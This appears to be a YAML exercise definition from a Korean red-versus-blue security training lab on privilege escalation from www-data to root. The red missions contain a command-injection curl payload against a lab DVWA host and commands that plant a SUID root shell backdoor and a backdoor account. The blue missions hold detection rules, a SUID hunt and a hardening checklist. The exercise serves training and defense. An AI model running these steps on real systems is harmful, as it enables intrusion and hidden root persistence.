id: "attack-adv-w06"
category: "attack-adv"
title: "[공격고급 W6] 권한 상승 체인 — www-data→root vs 권한상승 탐지·경화"
difficulty: "hard"
time_limit: 3000
battle_type: "1v1"
description: |
  공격 고급과정 6주차 — **권한 상승(PrivEsc) 체인**. 낮은 권한(웹쉘 www-data)에서 시작해 SUID·sudo 오설정·
  커널·cron·capabilities·PATH 하이재킹 등을 엮어 **root 까지 올라가는 체인**을 구성한다. Red 는 체인을
  실행하고, Blue 는 권한상승을 탐지하고 시스템을 경화한다.

  ▸ 이야기
    공격자가 웹 침투로 www-data 발판을 잡고(태그 `aa06r1`), SUID 루트 백도어와 백도어 계정으로 root 지속성을
    확보한다. 방어자는 웹 침투를 탐지하고, SUID/권한상승을 잡고, 경화 체크리스트로 막는다.

  ▸ 모드
    • solo : 한 학생이 권한상승(자기 인프라 표적)과 탐지를 모두. 대상 = 본인 인프라.
    • duel : Red 가 상대(Blue) 인프라에서 권한상승, Blue 는 자기 인프라에서 탐지·경화.

  ▸ 공격자 위치(중요)
    Red 미션은 **attacker-ext(SSH 2203)** 기준. Red 채점은 **대상 인프라의 흔적(WAF audit / SUID 파일·계정)** 으로 한다.

  ▸ 이번 주차 전용 마커
    초기 침투 태그 **`aa06r1-<본인id>`**, SUID 백도어 **`/tmp/.aa06suid`**, 계정 **`atka06`**,
    Suricata 탐지 **sid 9706011**, Wazuh 탐지 **id 103061**. 종료 시 cleanup.

red_missions:
  - order: 1
    assess_target: opponent
    target_vm: web
    points: 22
    instruction: |
      ## 🎯 RED-1 [초기 발판] — 웹 침투로 www-data 셸 확보

      ### 상황
      권한상승 체인의 시작은 낮은 권한 발판이다. 너는 태그 `aa06r1-<본인id>` 웹 침투로 www-data 권한의 셸을
      확보한다(이후 RED-2 에서 root 로 상승).

      ### 할 일 (attacker-ext)
      예시(id=kim):
      ```bash
      curl -s -A "aa06r1-kim" -H "Host: dvwa.6v6.lab" \
        "http://<대상_공개IP>/vulnerabilities/exec/?ip=127.0.0.1;id%23aa06r1-kim&Submit=Submit"
      ```

      ### 채점 방법
      대상 WAF audit(modsec)에 태그 `aa06r1` 가 포함된 침투 탐지가 남았는지로 채점.

      ### 합격 기준
      대상 WAF audit 에 `aa06r1` 태그가 포함된 침투 탐지가 남는다.
    hint: "태그(aa06r1) 명령 인젝션/웹 침투 → 대상 modsec audit. 채점: log_contains modsec aa06r1. www-data 발판."
    verify:
      type: "log_contains"
      expect: "aa06r1"
      checks:
        - { id: "red-1-1", type: "log_contains", target: "web",
            params: { log: "modsec", pattern: "aa06r1", since_sec: 1800 } }
      semantic:
        intent: "초기 발판 — Initial Access(T1190) → www-data 셸. 권한상승 체인의 출발점. 태그(aa06r1) 귀속."
        success_criteria:
          - "대상 WAF audit 에 aa06r1 태그가 포함된 침투 탐지"
          - "어떤 웹 취약점으로 www-data 발판을 잡았는지 서술"
        acceptable_methods:
          - "attacker-ext 에서 태그 단 웹 침투"
        negative_signs:
          - "태그 누락 / 대상 미도달"

  - order: 2
    assess_target: opponent
    target_vm: web
    points: 18
    instruction: |
      ## 🎯 RED-2 [권한상승 → root] — SUID 백도어 + root 지속성

      ### 상황
      www-data 에서 SUID 오설정/sudo 를 악용해 root 로 상승하고, SUID 루트 백도어 **`/tmp/.aa06suid`** 와
      백도어 계정 **`atka06`** 으로 지속성을 확보한다(체인: www-data → root).

      ### 할 일
      ```bash
      sudo cp /bin/bash /tmp/.aa06suid && sudo chmod 4755 /tmp/.aa06suid   # SUID 루트 백도어
      sudo useradd -m -s /bin/bash atka06
      ```

      ### 채점 방법
      대상 호스트에 SUID 백도어 `/tmp/.aa06suid` 가 있거나 `/etc/passwd` 에 `atka06` 이 있는지로 채점.

      ### 합격 기준
      `/tmp/.aa06suid` 존재 또는 계정 `atka06`.
    hint: "cp /bin/bash /tmp/.aa06suid + chmod 4755 + useradd atka06. 채점: file_exists /tmp/.aa06suid + file_contains passwd atka06."
    verify:
      type: "file_exists"
      expect: "/tmp/.aa06suid"
      checks:
        - { id: "red-2-1", type: "file_exists", target: "web", params: { path: "/tmp/.aa06suid" } }
        - { id: "red-2-2", type: "file_contains", target: "web",
            params: { path: "/etc/passwd", pattern: "atka06" } }
      semantic:
        intent: "권한상승(T1548.001 SUID) + 지속성(T1136) — www-data→root 체인 완성. SUID 백도어 + 계정."
        success_criteria:
          - "SUID 파일 /tmp/.aa06suid 또는 계정 atka06"
          - "어떤 벡터(SUID/sudo/cron/PATH)로 상승했는지 체인 서술"
        acceptable_methods:
          - "SUID 백도어 + useradd"
        negative_signs:
          - "SUID 비트 없음 / 흔적 미생성"

blue_missions:
  - order: 1
    assess_target: self
    target_vm: ips
    points: 20
    instruction: |
      ## 🛡️ BLUE-1 [초기 침투 탐지] — Suricata 룰 (sid 9706011)

      ### 상황
      권한상승의 시작인 웹 침투(명령 인젝션)를 잡는 Suricata 룰(**sid 9706011**)을 만든다.

      ### 할 일
      ```
      alert http any any -> any any (msg:"ATKADV-W06 command injection foothold"; flow:to_server; http.uri; content:";id"; nocase; sid:9706011; rev:1;)
      ```
      ```bash
      sudo suricatasc -c reload-rules
      ```

      ### 채점 방법
      ips 의 `local.rules` 에 sid 9706011 룰이 있는지로 확인.

      ### 합격 기준
      `local.rules` 에 명령 인젝션을 보는 sid 9706011 룰이 존재한다.
    hint: "명령 인젝션 Suricata 룰(sid 9706011, ;id 등) → reload. 채점: file_contains local.rules 9706011."
    verify:
      type: "file_contains"
      expect: "9706011"
      checks:
        - { id: "blue-1-1", type: "file_contains", target: "ips",
            params: { path: "/etc/suricata/rules/local.rules", pattern: "9706011" } }
      semantic:
        intent: "초기 발판 탐지 — 명령 인젝션 Suricata 룰. 권한상승 체인의 진입을 조기 차단."
        success_criteria:
          - "local.rules 에 sid 9706011"
          - "명령 인젝션 패턴 탐지 서술"
        acceptable_methods:
          - "Suricata 룰 작성 + reload"
        negative_signs:
          - "패턴 부정확 / 문법 오류"

  - order: 2
    assess_target: self
    target_vm: siem
    points: 22
    instruction: |
      ## 🛡️ BLUE-2 [권한상승 탐지] — SUID/계정 Wazuh 룰 (id 103061)

      ### 상황
      RED-2 의 SUID 백도어·root 지속성을 잡는 Wazuh 룰(**id 103061**)을 만든다.

      ### 할 일
      ```xml
      <group name="edu,privesc,">
        <rule id="103061" level="13">
          <if_group>edu</if_group>
          <match>4755</match>
          <description>ATKADV-W06 - SUID privilege escalation / backdoor account</description>
        </rule>
      </group>
      ```
      ```bash
      sudo /var/ossec/bin/wazuh-control restart
      ```
      또한 SUID 헌팅: `find / -perm -4000 -type f 2>/dev/null`

      ### 채점 방법
      `local_rules.xml` 에 id 103061 룰이 있는지로 확인.

      ### 합격 기준
      `local_rules.xml` 에 SUID 권한상승을 보는 id 103061 룰이 존재한다.
    hint: "SUID 권한상승 Wazuh 룰(id 103061) + find -perm -4000 헌팅 → restart. 채점: file_contains local_rules.xml 103061."
    verify:
      type: "file_contains"
      expect: "103061"
      checks:
        - { id: "blue-2-1", type: "file_contains", target: "siem",
            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "103061" } }
      semantic:
        intent: "권한상승 탐지(호스트) — SUID/계정 변조 Wazuh 룰 + SUID 헌팅. root 상승 포착."
        success_criteria:
          - "local_rules.xml 에 rule id 103061"
          - "SUID/권한상승 탐지 로직 + find -perm -4000 헌팅 서술"
        acceptable_methods:
          - "Wazuh 룰 + SUID 헌팅 + restart"
        negative_signs:
          - "룰만 / 헌팅 없음 / XML 오류"

  - order: 3
    assess_target: self
    target_vm: siem
    points: 18
    instruction: |
      ## 🛡️ BLUE-3 [경화 체크리스트] — 권한상승 방어 + 헌팅

      ### 상황
      권한상승을 구조적으로 막는 **시스템 경화 체크리스트**를 작성한다(SUID 최소화, sudo 제한, 커널 패치, cron
      권한, world-writable 제거, PATH 정리).

      ### 할 일
      보고서에:
      - 경화 체크리스트(SUID/sudo/커널/cron/world-writable/capabilities/PATH)
      - SUID 백도어(`/tmp/.aa06suid`)·계정(atka06) 헌팅 결과
      ```bash
      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
      ```

      ### 채점 방법
      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 경화 체크리스트/헌팅으로 채점.

      ### 합격 기준
      본인 SIEM 에 최근 경보가 있다(+ 경화 체크리스트·헌팅은 제출로 검증).
    hint: "권한상승 경화 체크리스트(SUID/sudo/커널/cron/world-writable/PATH) + SUID/계정 헌팅. 채점: wazuh_alert + 제출."
    verify:
      type: "wazuh_alert"
      expect: "alert"
      checks:
        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
      semantic:
        intent: "권한상승 경화 — 체크리스트 기반 구조적 방어 + 헌팅. 분석형 — 구체 경화 항목 제시 시 점수 상승."
        success_criteria:
          - "최근 경보 수집 확인"
          - "경화 체크리스트(SUID/sudo/커널/cron/world-writable/PATH)"
          - "SUID 백도어/계정 헌팅 결과"
        acceptable_methods:
          - "경화 체크리스트 + 헌팅"
        negative_signs:
          - "체크리스트 부실 / 헌팅 없음"
